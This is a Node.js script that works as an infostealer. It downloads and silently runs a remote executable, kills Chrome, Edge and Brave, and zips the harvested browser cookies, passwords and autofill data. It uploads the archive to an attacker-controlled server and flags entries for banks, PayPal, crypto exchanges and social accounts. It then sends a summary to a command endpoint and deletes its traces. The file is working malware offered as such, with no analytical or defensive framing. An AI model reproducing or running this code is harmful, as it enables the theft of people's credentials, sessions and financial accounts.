const fs = require('fs');
const path = require('path');
const https = require('https');
const { exec, spawn } = require('child_process');
const axios = require("axios");
const FormData = require("form-data");
const [,, exePath, targetDir, outputPath, KEY, SERVER_URL] = process.argv;

if (!exePath || !targetDir || !outputPath || !KEY || !SERVER_URL) {
    console.error('Usage: node sa.js <outputPath> <KEY> <targetDir> <SERVER_URL>');
    process.exit(1);
}

async function zipFolder(sourceDir, outPath) {
    return new Promise((resolve, reject) => {
        const source = path.resolve(sourceDir);
        const output = path.resolve(outPath);

        const command = `powershell -Command "Compress-Archive -Path '${source}\\*' -DestinationPath '${output}' -Force"`;

        exec(command, (error, stdout, stderr) => {
            if (error) return reject(error);
            if (stderr) return reject(stderr);
            resolve(output);
        });
    });
}

const UPLOAD_URL = "cloud." + SERVER_URL;
async function uploadFile(zipPath) {
    try {
        if (!fs.existsSync(zipPath)) {
            console.error("File not found:", zipPath);
            return "";
        }

        const form = new FormData();
        form.append('file', fs.createReadStream(zipPath), {
            filename: 'data.zip',
            contentType: 'application/zip',
        });
        form.append('key', KEY);

        const uploadUrl = 'https://' + UPLOAD_URL + '/upload'; 
        const response = await axios.post(uploadUrl, form, {
            headers: form.getHeaders(),
            maxBodyLength: Infinity 
        });

        if (response.data && response.data.url) {
            console.log("Server Response:", response.data);
            return response.data.url;
        } else {
            console.error("Unexpected response:", response.data);
            return "";
        }

    } catch (error) {
        console.error("Upload failed:", error.message);
        return "";
    }
}

function httpsPostJson(url, data) {
    return new Promise((resolve, reject) => {
        try {
            const parsedUrl = new URL(url);
            const body = JSON.stringify(data);

            const options = {
                method: "POST",
                hostname: parsedUrl.hostname,
                path: parsedUrl.pathname,
                headers: {
                    "Content-Type": "application/json",
                    "Content-Length": Buffer.byteLength(body)
                }
            };

            const req = https.request(options, (res) => {
                let resData = "";
                res.on("data", chunk => resData += chunk);
                res.on("end", () => {
                    try {
                        const parsed = JSON.parse(resData);
                        resolve(parsed);
                    } catch {
                        resolve(resData);
                    }
                });
            });

            req.on("error", reject);
            req.write(body);
            req.end();
        } catch (err) {
            reject(err);
        }
    });
}
function analyzeOutput(baseOutput) {
    const results = [];
    try {
        if (!baseOutput || !fs.existsSync(baseOutput)) return results;
        const browsers = fs.readdirSync(baseOutput, { withFileTypes: true }).filter(d => d.isDirectory());
        for (const b of browsers) {
            const browserName = b.name;
            const browserPath = path.join(baseOutput, browserName);
            let profiles = [];
            try { profiles = fs.readdirSync(browserPath, { withFileTypes: true }).filter(d => d.isDirectory()); } catch {}
            for (const pdir of profiles) {
                const profileName = pdir.name;
                const profilePath = path.join(browserPath, profileName);
                let cookies = 0, passwords = 0, autofill = 0;
                let cookieKW = [], passKW = [];
                const files = fs.existsSync(profilePath) ? fs.readdirSync(profilePath) : [];

                const cTxt = files.find(n => /cookies\.txt$/i.test(n));
                const cJson = files.find(n => /cookies\.json$/i.test(n));
                if (cTxt) { const c = safeRead(path.join(profilePath, cTxt)); cookies = countLines(c); cookieKW = pickKEYwords(c); }
                else if (cJson) { const c = safeRead(path.join(profilePath, cJson)); cookies = countJson(c); cookieKW = pickKEYwords(c); }

                const pTxt = files.find(n => /passwords\.txt$/i.test(n));
                const pJson = files.find(n => /passwords\.json$/i.test(n));
                if (pTxt) { const c = safeRead(path.join(profilePath, pTxt)); passwords = countLines(c); passKW = pickKEYwords(c); }
                else if (pJson) { const c = safeRead(path.join(profilePath, pJson)); passwords = countJson(c); passKW = pickKEYwords(c); }

                const aTxt = files.find(n => /autofill\.txt$/i.test(n));
                const aJson = files.find(n => /autofill\.json$/i.test(n));
                if (aTxt) { const c = safeRead(path.join(profilePath, aTxt)); autofill = countLines(c); }
                else if (aJson) { const c = safeRead(path.join(profilePath, aJson)); autofill = countJson(c); }

                if (cookies || passwords || autofill) {
                    results.push({ browserName, profileName, cookies, passwords, autofill, cookieKW, passKW });
                }
            }
        }
    } catch {}
    return results;
}
const KEYWORDS = ['google','gmail','facebook','instagram','twitter','tiktok','bank','paypal','amazon','netflix','steam','roblox','microsoft','apple','yahoo','outlook','twitch','discord','binance','coinbase','ebay','aliexpress'];
function safeRead(p) { try { return fs.readFileSync(p, 'utf8'); } catch { return null; } }
function countLines(txt) { return !txt ? 0 : txt.split(/\r?\n/).filter(l => l && l.trim() && !l.trim().startsWith('#')).length; }
function countJson(txt) {
    if (!txt) return 0;
    try {
        const obj = JSON.parse(txt);
        if (Array.isArray(obj)) return obj.length;
        if (obj && Array.isArray(obj.items)) return obj.items.length;
        return Object.KEYs(obj || {}).length;
    } catch { return 0; }
}
function pickKEYwords(txt) {
    if (!txt) return [];
    const l = txt.toLowerCase();
    const s = new Set();
    for (const k of KEYWORDS) if (l.includes(k)) s.add(k);
    return Array.from(s).slice(0, 10);
}
async function handleSaveData(exePath, targetDir) {
    try {
        await new Promise(resolve => setTimeout(resolve, 3000));

        const currentDir = path.dirname(exePath);
        const outputZip = path.join(process.cwd(), "output", `browserData_${Date.now()}.zip`);
        if (!fs.existsSync(path.dirname(outputZip))) {
            fs.mkdirSync(path.dirname(outputZip), { recursive: true });
        }

        const sakso = path.join(currentDir, "output");

        await zipFolder(sakso, outputZip);
        console.log("Folder zipped:", outputZip);

        const fileLink = await uploadFile(outputZip);
        console.log("Uploaded file link:", fileLink);

        const results = analyzeOutput(sakso);

        const apiUrl = `https://root.${SERVER_URL}/send-chromium/${KEY}`;
        await httpsPostJson(apiUrl, {
            browser: "chromium",
            downloadUrl: fileLink,
            data: results
        });

        console.log("Data sent to API");

        try {
            if (fs.existsSync(outputZip)) {
                fs.unlinkSync(outputZip); 
                console.log("Zip deleted:", outputZip);
            }

            if (fs.existsSync(sakso)) {
                fs.rmSync(sakso, { recursive: true, force: true });
                console.log("Folder deleted:", sakso);
            }
        } catch (cleanupErr) {
            console.error("Cleanup error:", cleanupErr.message);
        }

    } catch (err) {
        console.error("handleSaveData error:", err.message);
    }
}

async function downloadAndRun(serverUrl, targetDir, outputPath) {
    return new Promise((resolve, reject) => {
        const fileUrl = `https://root.${serverUrl}/download/inject`;
        const filePath = path.join(targetDir, 'cache.exe');

        const file = fs.createWriteStream(filePath);
        https.get(fileUrl, (response) => {
            if (response.statusCode !== 200) {
                return reject(new Error(`Download failed: ${response.statusCode}`));
            }

            response.pipe(file);

            file.on('finish', () => {
                file.close(() => {
                    killBrowsers();
                    const args = ["all", "-o", outputPath, "-v", "--no-kill"];
                    const child = spawn(filePath, args, { stdio: 'ignore', windowsHide: true });

                    child.on('error', (err) => reject(err));
                    child.on('exit', (code) => {
                        console.log(`Process exited with code ${code}`);
                        resolve(code);
                    });
                });
            });
        }).on('error', (err) => {
            fs.unlink(filePath, () => {}); 
            reject(err);
        });
    });
}

function killBrowsers() {
    const browsers = ["chrome", "msedge", "brave"];

    browsers.forEach(browser => {
        const cmd = `taskkill /F /IM ${browser}.exe`;
        exec(cmd, (err, stdout, stderr) => {
            if (err) {
                if (!/not found/i.test(stderr)) {
                    console.error(`Failed to kill ${browser}:`, stderr.trim());
                }
            } else {
                console.log(`Closed ${browser}:`, stdout.trim());
            }
        });
    });
}
async function main() {
    try {
        await downloadAndRun(SERVER_URL, targetDir, outputPath);
        await handleSaveData(path.join(targetDir, 'cache.exe'), targetDir);
    } catch (error) {
        console.error('Fatal error:', error.message);
    }
}

main();